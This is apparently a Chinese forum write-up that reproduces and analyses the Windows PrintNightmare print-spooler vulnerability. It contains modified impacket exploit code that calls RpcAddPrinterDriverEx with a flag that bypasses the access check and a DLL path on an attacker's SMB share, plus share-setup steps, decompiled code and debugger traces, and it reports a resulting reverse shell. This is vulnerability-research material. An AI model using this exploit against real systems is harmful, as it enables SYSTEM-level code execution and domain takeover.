> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-271241.htm)

> [原创] Windows PrintNightmare 漏洞复现分析

漏洞简介
----

Windows Print Spooler 是打印后台处理服务，即管理所有本地和网络打印队列及控制所有打印工作。Windows Print Spooler 存在权限提升漏洞，经过身份认证的攻击者可利用此漏洞使 Spooler 服务加载恶意 DLL，从而获取权限提升。利用此漏洞需身份认证，攻击者可通过多种方式获得身份认证信息。在域环境中合适的条件下，未经身份验证的远程攻击者可利用该漏洞以 SYSTEM 权限在域控制器上执行任意代码，从而获得整个域的控制权。

目标函数定位
------

尽管微软将 PrintNightmare 分配给了 CVE-2021-34527，笔者仍然认为它是 CVE-2021-1675 带来的远程代码执行相关的利用。首先进行补丁对比，比较明显的是 RpcAddPrinterDriverEx 函数，在调用 YAddPrinterDriverEx 函数前会进行判断，如果满足一定条件就对 dwFileCopyFlags 进行 &FFFF7FFF 处理，这样操作是为了取消 dwFileCopyFlags 中指定的 0x8000。

 

![](https://bbs.pediy.com/upload/attach/202201/701197_JWC7FYW7Z56AZPF.png)

 

![](https://bbs.pediy.com/upload/attach/202201/701197_RXEA2Z5EPS72VMW.png)

 

查看文档可知，0x00008000 代表 APD_INSTALL_WARNED_DRIVER，添加打印机驱动程序，即使它在服务器的警告打印机驱动程序列表中。那么下一步就是构造请求使 spooler 程序调用 RpcAddPrinterDriverEx 函数。

 

首先看一下有没有历史 POC，这样稍作修改就可以使用了。很快就找到了 printerbug.py，它是基于 impacket 写的，并且调用了 RpcOpenPrinter。但是看了下，impacket 中并没有实现 RpcAddPrinterDriverEx，于是参照 impacket.dcerpc.v5.rprn 中的格式，为 RpcAddPrinterDriverEx 添加了类，如下所示：

```
# 3.1.4.4.8 RpcAddPrinterDriverEx (Opnum 89)
class RpcAddPrinterDriverEx(NDRCALL):
    opnum = 89
    structure = (
       ('pName', STRING_HANDLE),
       ('pDriverContainer', DRIVER_CONTAINER),
       ('dwFileCopyFlags', DWORD),
    )
 
class RpcAddPrinterDriverExResponse(NDRCALL):
    structure = (
       ('ErrorCode', ULONG),
    )
 
def hRpcAddPrinterDriverEx(dce, pName, DriverContainer, flags, level=2):
    request = RpcAddPrinterDriverEx()
 
    request['pName'] = pName
    request['pDriverContainer'] = DriverContainer
    request['dwFileCopyFlags'] = flags
    dce.request(request)
 
################################################################################
# OPNUMs and their corresponding structures
################################################################################
OPNUMS = {
    0  : (RpcEnumPrinters, RpcEnumPrintersResponse),
    1  : (RpcOpenPrinter, RpcOpenPrinterResponse),
    10 : (RpcEnumPrinterDrivers, RpcEnumPrinterDriversResponse),
    29 : (RpcClosePrinter, RpcClosePrinterResponse),
    65 : (RpcRemoteFindFirstPrinterChangeNotificationEx, RpcRemoteFindFirstPrinterChangeNotificationExResponse),
    69 : (RpcOpenPrinterEx, RpcOpenPrinterExResponse),
    89 : (RpcAddPrinterDriverEx, RpcAddPrinterDriverExResponse),
}

```

RpcAddPrinterDriverEx 函数的第二个参数类型 DRIVER_CONTAINER 有些复杂，但参考其他结构的格式很快就能为它写出定义代码：

```
##################################### MY ADD ######################################
# 2.2.1.5.1 DRIVER_INFO_1
class DRIVER_INFO_1(NDRSTRUCT):
    structure =  (
        ('notUsed',ULONGLONG),
    )
 
class PDRIVER_INFO_1(NDRPOINTER):
    referent = (
        ('Data', DRIVER_INFO_1),
    )
 
# 2.2.1.5.2 DRIVER_INFO_2
class DRIVER_INFO_2(NDRSTRUCT):
    structure =  (
        ('cVersion',DWORD),
        ('pName',LPWSTR),
        ('pEnvironment',LPWSTR),
        ('pDriverPath',LPWSTR),
        ('pDataFile',LPWSTR),
        ('pConfigFile',LPWSTR),
    )
 
class PDRIVER_INFO_2(NDRPOINTER):
    referent = (
        ('Data', DRIVER_INFO_2),
    )
 
# 2.2.1.5.3 RPC_DRIVER_INFO_3
class RPC_DRIVER_INFO_3(NDRSTRUCT):
    structure =  (
        ('cVersion',DWORD),
        ('pName',LPWSTR),
        ('pEnvironment',LPWSTR),
        ('pDriverPath',LPWSTR),
        ('pDataFile',LPWSTR),
        ('pConfigFile',LPWSTR),
        ('pHelpFile',LPWSTR),
        ('pMonitorName',LPWSTR),
        ('pDefaultDataType',LPWSTR),
        ('cchDependentFiles',DWORD),
        ('pDependentFiles',LPWSTR),
    )
 
class PRPC_DRIVER_INFO_3(NDRPOINTER):
    referent = (
        ('Data', RPC_DRIVER_INFO_3),
    )
 
# 2.2.1.5.4 RPC_DRIVER_INFO_4
class RPC_DRIVER_INFO_4(NDRSTRUCT):
    structure =  (
        ('cVersion',DWORD),
        ('pName',LPWSTR),
        ('pEnvironment',LPWSTR),
        ('pDriverPath',LPWSTR),
        ('pDataFile',LPWSTR),
        ('pConfigFile',LPWSTR),
        ('pHelpFile',LPWSTR),
        ('pMonitorName',LPWSTR),
        ('pDefaultDataType',LPWSTR),
        ('cchDependentFiles',DWORD),
        ('pDependentFiles',LPWSTR),
        ('cchPreviousNames',DWORD),
        ('pszzPreviousNames',LPWSTR),
    )
 
class PRPC_DRIVER_INFO_4(NDRPOINTER):
    referent = (
        ('Data', RPC_DRIVER_INFO_4),
    )
 
# 2.2.1.5.5 RPC_DRIVER_INFO_6
class FILETIME(NDRSTRUCT):
    structure =  (
        ('dwLowDateTime',DWORD),
        ('dwHighDateTime',DWORD),
)
 
class RPC_DRIVER_INFO_6(NDRSTRUCT):
    structure =  (
        ('cVersion',DWORD),
        ('pName',LPWSTR),
        ('pEnvironment',LPWSTR),
        ('pDriverPath',LPWSTR),
        ('pDataFile',LPWSTR),
        ('pConfigFile',LPWSTR),
        ('pHelpFile',LPWSTR),
        ('pMonitorName',LPWSTR),
        ('pDefaultDataType',LPWSTR),
        ('cchDependentFiles',DWORD),
        ('pDependentFiles',LPWSTR),
        ('cchPreviousNames',DWORD),
        ('pszzPreviousNames',LPWSTR),
        ('ftDriverDate',FILETIME),
        ('dwlDriverVersion',ULONGLONG),
        ('pMfgName',LPWSTR),
        ('pOEMUrl',LPWSTR),
        ('pHardwareID',LPWSTR),
        ('pProvider',LPWSTR),
    )
 
class PRPC_DRIVER_INFO_6(NDRPOINTER):
    referent = (
        ('Data', RPC_DRIVER_INFO_6),
    )
 
# 2.2.1.5.6 RPC_DRIVER_INFO_8
class RPC_DRIVER_INFO_8(NDRSTRUCT):
    structure =  (
        ('cVersion',DWORD),
        ('pName',LPWSTR),
        ('pEnvironment',LPWSTR),
        ('pDriverPath',LPWSTR),
        ('pDataFile',LPWSTR),
        ('pConfigFile',LPWSTR),
        ('pHelpFile',LPWSTR),
        ('pMonitorName',LPWSTR),
        ('pDefaultDataType',LPWSTR),
        ('cchDependentFiles',DWORD),
        ('pDependentFiles',LPWSTR),
        ('cchPreviousNames',DWORD),
        ('pszzPreviousNames',LPWSTR),
        ('ftDriverDate',FILETIME),
        ('dwlDriverVersion',ULONGLONG),
        ('pMfgName',LPWSTR),
        ('pOEMUrl',LPWSTR),
        ('pHardwareID',LPWSTR),
        ('pProvider',LPWSTR),
        ('pPrintProcessor',LPWSTR),
        ('pVendorSetup',LPWSTR),
        ('cchColorProfiles',DWORD),
        ('pszzColorProfiles',LPWSTR),
        ('pInfPath',LPWSTR),
        ('dwPrinterDriverAttributes',DWORD),
        ('cchCoreDependencies',DWORD),
        ('ftMinInboxDriverVerDate',FILETIME),
        ('dwlMinInboxDriverVerVersion',ULONGLONG),
    )
 
class PRPC_DRIVER_INFO_8(NDRPOINTER):
    referent = (
        ('Data', RPC_DRIVER_INFO_8),
    )
 
# 2.2.1.2.3 DRIVER_CONTAINER
class Driver_Info_UNION(NDRUNION):
    commonHdr = (
        ('tag', ULONG),
    )
    union = {
        1 : ('pNotUsed', PDRIVER_INFO_1),
        2 : ('Level2', PDRIVER_INFO_2),
        3 : ('Level3', PRPC_DRIVER_INFO_3),
        4 : ('Level4', PRPC_DRIVER_INFO_4),
        5 : ('Level6', PRPC_DRIVER_INFO_6),
        6 : ('Level8', PRPC_DRIVER_INFO_8),
    }
 
class DRIVER_CONTAINER(NDRSTRUCT):
    structure =  (
        ('Level',DWORD),
        ('DriverInfo',Driver_Info_UNION),
    )

```

接下来修改 printerbug.py，主要修改了 PrinterBug 类中的 lookup 函数（这里有一个坑，LPWSTR 这些字符串要以 \x00 结尾，不然会报 rpc_x_bad_stub_data 错误，之前就卡在这里了），如下：

```
#def lookup(self, rpctransport, host):
        level = 2
        Driver_Info_Union = rprn.Driver_Info_UNION()
        Driver_Info_Union['tag'] = level
        DRIVER_INFO = Driver_Info_Union["Level"+str(level)]
 
        DRIVER_INFO['cVersion'] = 3
        DRIVER_INFO['pName'] = "Test printer\x00"
        DRIVER_INFO['pEnvironment'] = "Windows x64\x00"
        DRIVER_INFO['pDriverPath'] = pDriverPath
        DRIVER_INFO['pDataFile'] = "\\\\{}\\smb\\asd.dll\x00".format(self.__attackerhost)
        DRIVER_INFO['pConfigFile'] = "C:\\Windows\\System32\\winhttp.dll\x00"
 
        DriverContainer = rprn.DRIVER_CONTAINER()
        DriverContainer['Level'] = level
        DriverContainer['DriverInfo'] = Driver_Info_Union
 
        #resp = rprn.hRpcEnumPrinters(dce, rprn.PRINTER_ENUM_NAME)
        print("[*] Attempting to call RpcAddPrinterDriverEx")
        pName = NULL
        flags = rprn.APD_COPY_ALL_FILES | 0x10 | 0x8000
        resp = rprn.hRpcAddPrinterDriverEx(dce, pName, DriverContainer, flags)

```

在测试之前还需要在共享的机器上配置允许匿名共享，不然会报错，如下：

```
┌──(strawberry㉿kalilili)-[~]
└─$ python testprinter.py strawberry@192.168.140.222 192.168.140.144
[*] Impacket v0.9.24.dev1+20210618.54810.11f43043 - Copyright 2021 SecureAuth Corporation
 
Password:
[*] Attempting to trigger authentication via rprn RPC at 192.168.140.222
[*] Bind OK
[*] Attempting to call RpcAddPrinterDriverEx ......
[-] Lookup Error: RPRN SessionError: code: 0x2 - ERROR_FILE_NOT_FOUND - The system cannot find the file specified.

```

在 Windows 机器可以做如下配置：

```
新建文件夹 Share
 
    右键属性 - 共享 - 网络和共享中心 - 设置 关闭密码保护共享
    右键属性 - 共享 - 高级共享 - 选中 共享此文件夹
    右键属性 - 共享 - 高级共享 - 权限 - 授予 Everyone 用户完全控制权限
    右键属性 - 安全 - 添加 Everyone 用户并授予完全控制权限
 
gpedit.msc
 
    计算机配置 - Windows 设置 - 安全设置 - 本地策略
 
        用户权限分配
 
            拒绝从网络访问这台计算机 (从列表中删除 Guest)
 
        安全选项
 
            网络访问: 本地账户的共享和安全模型 (选择 仅来宾)
            网络访问: 将 Everyone 权限应用于匿名用户 (设置 已启用)
            网络访问: 可匿名访问的共享 (新增 Share)

```

如果攻击机是 Linux，可以搭建 SMB 服务，然后修改 /etc/samba/smb.conf & sudo service smbd start：

```
[global]
map to guest = Bad User
server role = standalone server
usershare allow guests = yes
idmap config * : backend = tdb
smb ports = 445
 
[smb]
comment = Samba
path = /tmp/
guest ok = yes
read only = no
browsable = yes

```

简要漏洞分析
------

已经有很好的漏洞分析文章了，比如：https://www.freebuf.com/vuls/282023.html  
下面不再啰嗦，只是简单记录一下自己想知道的点。

*   **关于 RpcAddPrinterDriverEx 函数的第一个参数 pName**

以下为微软文档给出的 _pName_ 解释：  
该参数是一个指向字符串的指针，该字符串指定了该方法所操作的[打印服务器](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/831cd729-be7c-451e-b729-bd8d84ce4d24#gt_59fb3ddc-63cf-45df-8a90-46a6af9e00cb)的名称。这必须是[远程过程调用 (RPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/831cd729-be7c-451e-b729-bd8d84ce4d24#gt_8a7f6700-8311-45bc-af10-82e10accd331) 绑定到的[域名系统 (DNS)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/831cd729-be7c-451e-b729-bd8d84ce4d24#gt_604dcfcd-72f5-46e5-85c1-f3ce69956700)、 [NetBIOS](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/831cd729-be7c-451e-b729-bd8d84ce4d24#gt_b86c44e6-57df-4c48-8163-5e3fa7bdcff4)、 [互联网协议版本 4 (IPv4)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/831cd729-be7c-451e-b729-bd8d84ce4d24#gt_0f25c9b5-dc73-4c3e-9433-f09d1f62ea8e)、[互联网协议版本 6 (IPv6)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/831cd729-be7c-451e-b729-bd8d84ce4d24#gt_64c29bb6-c8b2-4281-9f3a-c1eb5d2288aa) 或[通用命名约定 (UNC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/831cd729-be7c-451e-b729-bd8d84ce4d24#gt_c9507dca-291d-4fd6-9cba-a9ee7da8c908) 名称，并且它必须唯一标识网络上的打印服务器。

 

此参数通过 FindSpoolerByNameIncRef 函数进行检查，如果通过校验，则返回 pLocalIniSpooler。但如果校验失败就不会去执行 SplAddPrinterDriverEx 函数。

 

![](https://bbs.pediy.com/upload/attach/202201/701197_58G8APQQ3YM4ZTY.png)

 

在这期间可能会执行 FindSpoolerByNameIncRef->FindSpoolerByName->FindSpooler->CheckMyName->CacheIsNameInNodeList->TNameResolutionCache::IsNameInNodeCache->TResolutionCacheNode::IsNameInNodeCache，直到匹配到一个 pName，如下所示：

```
//比较的 pattern
\\WIN-LGKSQLHSOLK
\\WIN-LGKSQLHSOLK.strawberry.edu
\\fe80::b9c7:c7bc:7744:be0e
\\192.168.140.222
 
 
C:\Users\Strawberry>ipconfig /all
Windows IP 配置
   主机名  . . . . . . . . . . . . . : WIN-LGKSQLHSOLK
   主 DNS 后缀 . . . . . . . . . . . : strawberry.edu
   节点类型  . . . . . . . . . . . . : 混合
   IP 路由已启用 . . . . . . . . . . : 否
   WINS 代理已启用 . . . . . . . . . : 否
   DNS 后缀搜索列表  . . . . . . . . : strawberry.edu
以太网适配器 Ethernet0:
   连接特定的 DNS 后缀 . . . . . . . :
   描述. . . . . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   物理地址. . . . . . . . . . . . . : 00-0C-29-37-33-E3
   DHCP 已启用 . . . . . . . . . . . : 否
   自动配置已启用. . . . . . . . . . : 是
   本地链接 IPv6 地址. . . . . . . . : fe80::b9c7:c7bc:7744:be0e%7(首选)
   IPv4 地址 . . . . . . . . . . . . : 192.168.140.222(首选)
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 192.168.140.2
   DHCPv6 IAID . . . . . . . . . . . : 83889193
   DHCPv6 客户端 DUID  . . . . . . . : 00-01-00-01-28-7F-09-CE-00-0C-29-37-33-E3
   DNS 服务器  . . . . . . . . . . . : ::1
                                       127.0.0.1
   TCPIP 上的 NetBIOS  . . . . . . . : 已启用

```

以下代码说明 pName 可以为 NULL，在 FindSpoolerByName 函数中如果 pName 不以 "\\" 开头则被判定为 LocalIniSpooler。在 SplAddPrinterDriverEx 函数中还是会调用 MyName->CheckMyName，如果 pName 为 NULL 的话，也会返回 1，这样也可以通过校验。Python 版的 poc 里面 pName 的值就是 NULL。"\\" 也是可以的，可以自己调试一下。

```
// localspl!FindSpoolerByName
  if ( !pName )
    return pLocalIniSpooler;
  if ( *pName != 0x5C || pName[1] != 0x5C )
    return pLocalIniSpooler;
 
// localspl!SplAddPrinterDriverEx
  if ( !(unsigned int)MyName(pName_copy, a5) )  //需要函数返回1，不然不能执行后面流程
  {
    if ( (_UNKNOWN *)WPP_GLOBAL_Control != &WPP_GLOBAL_Control )
    {
      if ( *(_BYTE *)(WPP_GLOBAL_Control + 0x44i64) & 0x10 )
      {
        GetLastError();
        WPP_SF_Sd(*(_QWORD *)(WPP_GLOBAL_Control + 0x38i64));
      }
    }
    return 0i64;
  }
  v11 = 0;
  if ( !_bittest((const int *)&dwFileCopyFlags_copy, 0xFu) )
    v11 = num_1;
  if ( v11 && !(unsigned int)ValidateObjectAccess(0, 1, 0i64, 0i64, (__int64)pLocalIniSpooler, 0) )
    return 0i64;
  return InternalAddPrinterDriverEx(
           pName_copy,
           Level_copy,
           pDriverInfo_copy,
           dwFileCopyFlags_copy,
           (struct _INISPOOLER *)a5,
           a6,
           v11,
           0i64);
 
// localspl!MyName
  if ( !(unsigned int)CheckMyName(pName_copy, v4) )
  {
    SetLastError(0x7Bu);
    v3 = 0;
  }
 
// localspl!CheckMyName
  v2 = 0;
  pLocalIniSpooler_copy = pLocalIniSpooler;
  v4 = pName;
  if ( !pName || !*pName )
    return 1i64;
  if ( *pName != 0x5C || pName[1] != 0x5C )
    return 0i64;
  v5 = *(char **)(pLocalIniSpooler + 0x18);     // 0:008> du poi(rdx+18)
                                                // 00000250`14a80dc0  "\\WIN-LGKSQLHSOLK"

```

*   **关键函数**

继续看 localspl!SplAddPrinterDriverEx 函数，如果通过了 MyName 校验，会执行下面的代码，比较 dwFileCopyFlags 的第 0xF（15，从 0 开始索引） 是否被设置，如果设置了该比特位（我们已将其设置为 0x8014），就不会执行 v11 = 1 将 v11 置 1，因而在执行 if (v11 && !(unsigned int)ValidateObjectAccess(0, 1, 0i64, 0i64, (__int64)pLocalIniSpooler, 0) ) 时，v11 还是 0，从而绕过 ValidateObjectAccess 函数的检查去执行 InternalAddPrinterDriverEx 函数。InternalAddPrinterDriverEx 函数执行完之后，Spooler 服务就会加载指定的 DriverFile 和 ConfigFile 模块，如下所示：

```
__int64 __usercall SplAddPrinterDriverEx@(LPCWSTR pName@, unsigned int Level@, __int64 pDriverInfo@, unsigned int dwFileCopyFlags@, __int64 a5, int a6, int num_1)
{
  ……
  CacheAddName(pName);
  if ( !(unsigned int)MyName(pName_copy, a5) )
  {
    ……
    return 0i64;
  }
  v11 = 0;
  if ( !_bittest((const int *)&dwFileCopyFlags_copy, 0xFu) )
    v11 = 1;
  if ( v11 && !(unsigned int)ValidateObjectAccess(0, 1, 0i64, 0i64, (__int64)pLocalIniSpooler, 0) )
    return 0i64;
  return InternalAddPrinterDriverEx(
           pName_copy,
           Level_copy,
           pDriverInfo_copy,
           dwFileCopyFlags_copy,
           (struct _INISPOOLER *)a5,
           a6,
           v11,
           0i64);
}
 
0:005>
localspl!SplAddPrinterDriverEx+0xea:
00007ffa`b60a56aa e829dbffff      call    localspl!InternalAddPrinterDriverEx (00007ffa`b60a31d8)
0:005> p
ModLoad: 00007ffa`daa70000 00007ffa`daacd000   C:\Windows\System32\ntprint.dll
ModLoad: 00007ffa`b4180000 00007ffa`b422d000   C:\Windows\System32\mscms.dll
ModLoad: 00007ffa`e6920000 00007ffa`e6930000   C:\Windows\System32\ColorAdapterClient.dll
ModLoad: 00007ffa`ee780000 00007ffa`ee793000   C:\Windows\System32\DEVRTL.dll
ModLoad: 00007ffa`ec240000 00007ffa`ec25d000   C:\Windows\System32\SPINF.dll
ModLoad: 00007ffa`abe00000 00007ffa`abefc000   C:\Windows\system32\spool\DRIVERS\x64\3\winhttp.dll
ModLoad: 00007ffa`daa40000 00007ffa`daac4000   C:\Windows\system32\spool\DRIVERS\x64\3\UNIDRV.DLL
localspl!SplAddPrinterDriverEx+0xef:
00007ffa`b60a56af 488b5c2460      mov     rbx,qword ptr [rsp+60h] ss:00000068`0247ec20=00000254fc86c6a8
0:005> r rax
rax=0000000000000001    // 成功返回 1 
```

*   **控制 pConfigFile**

通过前面分析，我们已经有办法可以让 Spooler 服务加载指定 DLL，还是要试一下看它可不可以加载网络上的文件，这样影响将更大一些（本地变远程）。如果将 pConfigFile 直接设置为 UNC 路径（网络路径）会报错。这是因为在 InternalAddPrinterDriverEx 调用 ValidateDriverInfo 函数时会进行以下判断，如果 dwFileCopyFlags 设置了 0x10，pDriverPath 和 pConfigFile 必须是本地文件，否则就会产生 0x57 错误。

```
if ( length_index < 0x104 )
{
  if ( !(dwFileCopyFlags & 0x10)
    || (unsigned int)IsLocalFile(pDriverPath) && (unsigned int)IsLocalFile(pConfigFile) )
  {
     ……
  }
  else
  {
    v12 = WPP_GLOBAL_Control;
    if ( (_UNKNOWN *)WPP_GLOBAL_Control != &WPP_GLOBAL_Control && *(_BYTE *)(WPP_GLOBAL_Control + 68i64) & 0x10 )
    {
      WPP_SF_SSS(*(_QWORD *)(WPP_GLOBAL_Control + 0x38i64), 0x15i64);
      v12 = WPP_GLOBAL_Control;
    }
    v9 = 0x57;
  }
}

```

以下为调试时信息，可更加直观展示这一流程：

```
0:002> g
Breakpoint 4 hit
localspl!ValidateDriverInfo:
00007ffa`b60a181c 48895c2410      mov     qword ptr [rsp+10h],rbx ss:00000068`0218e2e8=0000000000000000
 
0:002> dq rcx
00000254`fd11a600  00000000`00000003 00000254`fc86e900
00000254`fd11a610  00000254`fc86e928 00000254`fc86e94c
00000254`fd11a620  00000254`fc86ea20 00000254`fc86ea6c
00000254`fd11a630  00000030`4d454d4c 00000254`fd118e58
00000254`fd11a640  00000254`fd118e60 80000100`e5061f36
00000254`fd11a650  00000000`00000003 00000254`fc866080
00000254`fd11a660  00000254`fc8660a8 00000254`fc8660cc
00000254`fd11a670  00000254`fc8661a0 00000254`fc8661ec
 
0:002> du 254`fc86e900    // pName
00000254`fc86e900  "Test printer"
0:002> du 254`fc86e928    // pEnvironment
00000254`fc86e928  "Windows x64"
0:002> du 254`fc86e94c    // pDriverPath
00000254`fc86e94c  "C:\Windows\System32\DriverStore\"
00000254`fc86e98c  "FileRepository\ntprint.inf_amd64"
00000254`fc86e9cc  "_18b0d38ddfaee729\Amd64\UNIDRV.D"
00000254`fc86ea0c  "LL"
0:002> du 254`fc86ea20    // pDataFile
00000254`fc86ea20  "\\192.168.140.204\smb\asd.dll"
0:002> du 254`fc86ea6c    // pConfigFile
00000254`fc86ea6c  "\\192.168.140.204\smb\netlogon."
00000254`fc86eaac  "dll"
 
// IsLocalFile(pConfigFile) 校验失败后，SetLastError(0x57)
0:002>
localspl!ValidateDriverInfo+0x48a:
00007ffa`b60a1ca6 bf57000000      mov     edi,57h
……
0:002>
localspl!ValidateDriverInfo+0x739:
00007ffa`b60a1f55 85ff            test    edi,edi
0:002>
localspl!ValidateDriverInfo+0x73b:
00007ffa`b60a1f57 0f8533f9ffff    jne     localspl!ValidateDriverInfo+0x74 (00007ffa`b60a1890) [br=1]
……
0:002>
localspl!ValidateDriverInfo+0x97:
00007ffa`b60a18b3 8bcf            mov     ecx,edi
0:002>
localspl!ValidateDriverInfo+0x99:
00007ffa`b60a18b5 ff156d460600    call    qword ptr [localspl!_imp_SetLastError (00007ffa`b6105f28)] ds:00007ffa`b6105f28={ntdll!RtlSetLastWin32Error (00007ffa`f895e770)}

```

*   **观察程序行为**

再来看一下文件操作吧，借助 Process Monitor 我们可以看到程序先在 C:\Windows\System32\spool\drivers\x64\3 路径下创建了 Old 和 New 文件夹。

 

![](https://bbs.pediy.com/upload/attach/202201/701197_Y26YNDZWAJ79S2V.png)

 

将驱动文件复制到 C:\Windows\System32\spool\drivers\x64\3\New\ 文件夹下，同理 pConfigFile、pDataFile 也被复制进来。

 

![](https://bbs.pediy.com/upload/attach/202201/701197_MVJRUES33K8VNW7.png)

 

当多次去调用 RpcAddPrinterDriverEx 函数时程序会进行以下操作：

*   将新的文件复制到 C:\Windows\System32\spool\drivers\x64\3\New\ 目录下
    
    ![](https://bbs.pediy.com/upload/attach/202201/701197_9AN8D9EPKN24P3Z.png)
    
*   将 C:\Windows\System32\spool\drivers\x64\3 路径下的相关文件移动到 C:\Windows\System32\spool\drivers\x64\3\Old\1 (或 2、3……) ，然后将 C:\Windows\System32\spool\drivers\x64\3\New\ 目录下的相关文件移动到 C:\Windows\System32\spool\drivers\x64\3 路径下
    
    ![](https://bbs.pediy.com/upload/attach/202201/701197_2VUXAYRGS7ARZT5.png)
    
*   然后加载 C:\Windows\System32\spool\drivers\x64\3 路径下的 pDriverPath 和 pConfigFile
    
    ![](https://bbs.pediy.com/upload/attach/202201/701197_YW74PQ5MAMGRDJ6.png)
    

这样我们在后面的请求中将 pConfigFile 设置为 C:\Windows\System32\spool\drivers\x64\3\Old\X\asd.dll，如下所示，Spooler 服务成功加载恶意 DLL，并反弹了 SHELL。

 

![](https://bbs.pediy.com/upload/attach/202201/701197_W2KRCRWBHUAD48C.png)

 

**参考链接：**  
https://github.com/numanturle/PrintNightmare  
https://www.freebuf.com/vuls/282023.html  
https://mp.weixin.qq.com/s/iNOb6cBAfMwCm2AjqbdEvQ  
https://mp.weixin.qq.com/s/8j4ylHr8ZDhlrWMAwhVcmQ

[【公告】欢迎大家踊跃尝试高研班 11 月试题，挑战自己的极限！](https://bbs.pediy.com/thread-270220.htm)

[#漏洞分析](forum-150-1-153.htm) [#Windows](forum-150-1-160.htm)